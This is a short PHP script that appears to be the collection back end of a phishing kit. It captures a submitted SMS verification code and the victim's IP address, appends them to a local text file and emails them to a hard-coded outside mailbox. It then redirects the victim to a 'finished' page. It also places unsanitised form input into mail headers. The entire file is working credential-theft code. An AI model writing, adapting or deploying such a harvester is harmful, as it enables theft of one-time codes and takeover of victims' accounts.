<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------poko------------------------------\n";
$message .= "SMS  2        : ".$_POST['rr']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "-------------------poko--------------------------------\n";

$file = fopen("izi.txt","a");
fwrite($file, "\n".$message);
fclose($file);

$send = "omrilil11@outlook.com";


$subject = "Cod | $ip ]";
$headers = "From: <localhost>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
mail($VPN,$subject,$message,$headers);
mail($timedate,$subject,$message,$headers);

header("Location: fin1.html");

?>